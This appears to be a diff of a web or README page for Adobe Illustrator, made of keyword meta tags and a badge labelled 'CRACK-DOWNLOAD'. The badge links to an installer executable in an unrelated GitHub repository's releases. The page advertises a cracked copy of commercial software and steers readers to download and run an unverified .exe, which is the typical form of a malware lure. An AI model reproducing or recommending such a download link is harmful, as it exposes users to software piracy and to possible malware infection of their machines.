@@ -1,7 +1,7 @@
 <meta name="description" content="Adobe Illustrator: Professional vector graphic design software">
 <meta name="keywords" content="Adobe Illustrator, vector graphic design, graphic design software, illustrations, digital art, design tools, logo design">
 
-<h1>Adobe Illustrator: Craft Stunning Vector Graphics with Precision</h1>
+
 
 
 [<img src="https://img.shields.io/badge/Adobe-Illustrator-CRACK-DOWNLOAD-blue?style=for-the-badge">](https://github.com/arsham129/Adobe-Illustrator-Full-2024-2025/releases/download/2/installer-Adobe-Illustrator.exe)
